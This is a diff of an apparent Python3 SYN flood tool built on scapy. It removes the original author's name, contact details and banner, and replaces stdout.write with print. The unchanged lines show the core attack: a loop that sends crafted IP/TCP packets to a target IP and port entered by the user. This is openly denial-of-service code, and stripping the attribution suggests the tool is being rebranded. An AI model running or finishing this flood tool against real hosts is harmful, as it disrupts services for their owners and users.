@@ -1,10 +1,4 @@
 #!/usr/bin/python3
-# Emre Ovunc
-# info@emreovunc.com
-# Python3 SYN Flood Tool
-
-from os import system
-from sys import stdout
 from scapy.all import *
 from random import randint
 
@@ -41,16 +35,10 @@ def SYN_Flood(dstIP,dstPort,counter):
 		send(IP_Packet/TCP_Packet, verbose=0)
 		total+=1
 
-	stdout.write("\nTotal packets sent: %i\n" % total)
+	print("\nTotal packets sent: %i\n" % total)
 
 
 def info():
-	system("clear")
-	print ("#####################################")
-	print ("#        github.com/EmreOvunc       #")
-	print ("#####################################")
-	print ("# Welcome to Python3 SYN Flood Tool #")
-	print ("#####################################")
 
 	dstIP = input ("\nTarget IP : ")
 	dstPort = input ("Target Port : ")
